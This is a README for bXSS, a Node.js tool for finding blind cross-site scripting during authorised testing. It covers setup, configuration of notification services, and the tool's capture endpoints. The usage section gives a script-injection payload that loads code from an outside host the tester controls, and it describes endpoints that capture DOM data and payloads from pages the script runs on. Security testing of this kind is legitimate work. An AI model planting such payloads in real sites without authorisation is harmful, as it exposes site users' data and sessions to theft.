# [bXSS](https://github.com/LewisArdern/bXSS)

<!-- prettier-ignore-start -->
<a href="https://codeclimate.com/github/LewisArdern/bXSS/maintainability"><img src="https://api.codeclimate.com/v1/badges/a8e30934a0be1952891c/maintainability" /></a>
<a href="https://lgtm.com/projects/g/LewisArdern/bXSS/context:javascript"><img alt="Language grade: JavaScript" src="https://img.shields.io/lgtm/grade/javascript/g/LewisArdern/bXSS.svg?logo=lgtm&logoWidth=18"/></a>
<!-- prettier-ignore-end -->

bXSS is a utility which can be used by bug hunters and organizations to identify [Blind Cross-Site Scripting](https://ardern.io/2017/12/10/blind-xss/).

bXSS supports the following:

- [Intrusive Levels](./Images/intrusion.jpg)
- [Email](./Images/email.jpg)
  - [Auto report via /.well-known/security.txt](./Images/securitytxt.jpg)
- [Twilio](./Images/sms.jpg)
- [Slack](./Images/slack.jpg)
- [Webex Teams](./Images/cisco.jpg)
- [Discord](./Images/discord.jpg)
- [Twitter](./Images/twitter.jpg)
- [Github](./Images/github.JPG)
- [Payload Generation](./Images/payloads.jpg)
- [Save locally](./Images/file.jpg)

# Requirements

## Necessary

- Server you control
- Usable domain
- Node.js and Express.js

## Optional

- [Gmail](https://gmail.com)
- [Twilio Account](https://www.twilio.com/sms)
- [Slack Token](https://api.slack.com/docs/token-types)
- [Cisco Token](https://developer.webex.com/docs/api/v1/people/get-my-own-details)
- [Discord Token](https://github.com/reactiflux/discord-irc/wiki/Creating-a-discord-bot-&-getting-a-token)
- [Github Access Token](https://github.com/settings/tokens)
- [Twitter Developer Account](https://developer.twitter.com/en/apply/user)
- [SSL/TLS Certificate](https://letsencrypt.org)

# Step-Up

## Default

- cd bXSS && npm install
- Update The Configuration || Environment Variables
  - Domain
    - config.url = Domain intended for use e.g ardern.io
    - config.port.http = Port to run the Node.js app e.g 80
- Rename configExample.js to config.js

## Configuring Services

Services are optional, by default bXSS will save a markdown file to disk. If you don't want to use any service documented below, just delete the service from the config.

- Twilio
  - config.twilio.accountSid = [Twilio SID](https://support.twilio.com/hc/en-us/articles/223136607-What-is-an-Application-SID)
  - config.twilio.authToken = [Twilio Auth Token](https://support.twilio.com/hc/en-us/articles/223136027-Auth-Tokens-and-how-to-change-them)
  - config.twilio.to = ['+447500000000','+0018056826043'] Your telephone number(s)
  - config.twilio.from = [Twilio telephone number](https://support.twilio.com/hc/en-us/articles/223136207-Getting-started-with-your-new-Twilio-phone-number)
- Slack
  - config.slack.token = [Slack Token](https://api.slack.com/docs/token-types)
  - config.slack.channel = [Channel you want to send the report to](https://get.slack.help/hc/en-us/articles/201402297-Create-a-channel)
  - Slack permissions required [channels:read](https://api.slack.com/scopes/channels:read) and [chat:write](https://api.slack.com/scopes/chat:write)
- Cisco
  - config.ciscoSpark.token = [Cisco Token](https://developer.webex.com/docs/api/v1/people/get-my-own-details)
  - config.ciscoSpark.sparkRoom = ['email1@domain.com','email2@domain.com']
- Discord
  - Steps to create a bot:
    - Visit https://discordapp.com/developers/applications/
    - Create a new application (e.g bXSSForCompany)
    - Make a note of your CLIENT ID
    - Select 'Bot'
      - Choose a USERNAME and press 'Click to Reveal Token' (copy the token)
    - Visit the following URL (update with your CLIENT ID) https://discordapp.com/oauth2/authorize?&client_id=YOUR_CLIENT_ID&scope=bot&permissions=2048
    - Select the server you want your bot to join and authorize
    - Update the following values below for the bot to post to the 'text channel' e.g ('general')
  - config.discord.token = 'your bot token'
  - config.discord.channel = 'channel you want it to join, e.g general'
- Twitter
  - config.twitter.consumer_key = API Key
  - config.twitter.consumer_secret = API Secret Key
  - config.twitter.access_token_key = Application Access Token
  - config.twitter.access_token_secret = Application Access Token Secret
  - Permissions (Write)
  - config.twitter.recipient_id = Twitter User ID, which can be found [here](https://twitter.com/settings/your_twitter_data)
- Gmail
  - config.gmail.user = Gmail Username
  - config.gmail.pass = Gmail Password
  - config.gmail.to = ['email1@domain.com','email2@domain.com'] Where you want to send the emails
  - config.gmail.from = Who sent the message, usually Gmail Username
- Github
  - [config.github.accessToken](https://github.com/settings/tokens) = ''
  - config.github.repo = '' an example is lewisardern/bXSS

## Setting Up HTTPS

Consider using a [reverse proxy](https://www.nginx.com/resources/glossary/reverse-proxy-server/), for example in [NGINX](https://pastebin.com/nCVSh5iv), but if you want to configure HTTPS using express, follow the steps below:

- Obtain a let's Encrypt cert
  - [Manual](https://gist.github.com/davestevens/c9e437afbb41c1d5c3ab)
  - [certbot](https://medium.com/@yash.kulshrestha/using-lets-encrypt-with-express-e069c7abe625)
- Using Node.js
  - Update Configuration
    - config.letsEncrypt.TLS = true;
    - config.letsEncrypt.publicKey = \$Path/fullchain.pem
    - config.letsEncrypt.privateKey = \$Path/privkey.pem
    - config.letsEncrypt.ca = \$Path/chain.pem
    - config.port.https = 443

## Starting The Application

Once you have configured the above, simply start the server with any available utility at the application root directory:

- node app.js
- nodemon app.js
- pm2 start app.js

# Using

Once the application is functional, you would just identify sites you are authorized to test and start to inject different payloads that will attempt to load your resource, the easiest example is:

```
"><script src="https://example.com/m"></script>
```

The application has five core functions to utilize:

- POST - /m (Captures DOM information)
- GET - /m (Loads the payload)
- GET - /mH (Captures HTTP interactions)
- Payloads - /payloads (Gives payloads you can use for testing blind xss)
- Everything else - Loads alert(1)

# Contribute?

If you like the project, feel free to contribute or if you want to suggest improvements or notice any problems, file a [issue](https://github.com/LewisArdern/bXSS/issues).
